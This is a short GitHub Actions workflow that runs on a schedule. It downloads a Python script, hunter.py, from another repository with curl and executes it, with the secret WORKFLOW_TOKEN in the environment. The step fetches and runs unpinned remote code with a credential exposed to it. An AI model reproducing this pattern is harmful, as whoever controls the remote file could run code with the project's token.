
name: 💅 Blondie Pro-Check
on:
  schedule:
    - cron: '0 */3 * * *'
  workflow_dispatch:
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Run
        env:
          WORKFLOW_TOKEN: ${{ secrets.WORKFLOW_TOKEN }}
        run: |
          pip install requests
          curl -O https://raw.githubusercontent.com/Catsss3/assets-distributor/main/hunter.py
          python hunter.py
